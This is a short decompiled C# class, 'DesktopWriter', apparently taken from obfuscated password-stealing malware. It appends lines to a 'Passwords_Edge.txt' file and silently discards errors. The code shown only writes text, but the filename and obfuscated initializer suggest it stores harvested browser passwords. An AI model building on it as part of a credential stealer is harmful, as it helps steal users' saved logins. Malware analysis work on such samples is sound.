using System;
using System.Collections.Generic;
using System.IO;

namespace Moist
{
	// Token: 0x02000026 RID: 38
	public static class DesktopWriter
	{
		// Token: 0x060000BE RID: 190 RVA: 0x0000AF60 File Offset: 0x00009160
		public static void SetDirectory(string dir)
		{
			try
			{
				DesktopWriter.string_0 = dir;
			}
			catch
			{
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x0000AF8C File Offset: 0x0000918C
		public static void WriteLine(string str)
		{
			try
			{
				string path = Path.Combine(DesktopWriter.string_0, "Passwords_Edge.txt");
				File.AppendAllLines(path, new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x000047C0 File Offset: 0x000029C0
		// Note: this type is marked as 'beforefieldinit'.
		static DesktopWriter()
		{
			Class40.gcO0h7LzslQIW();
			DesktopWriter.string_0 = "";
		}

		// Token: 0x04000071 RID: 113
		private static string string_0;
	}
}
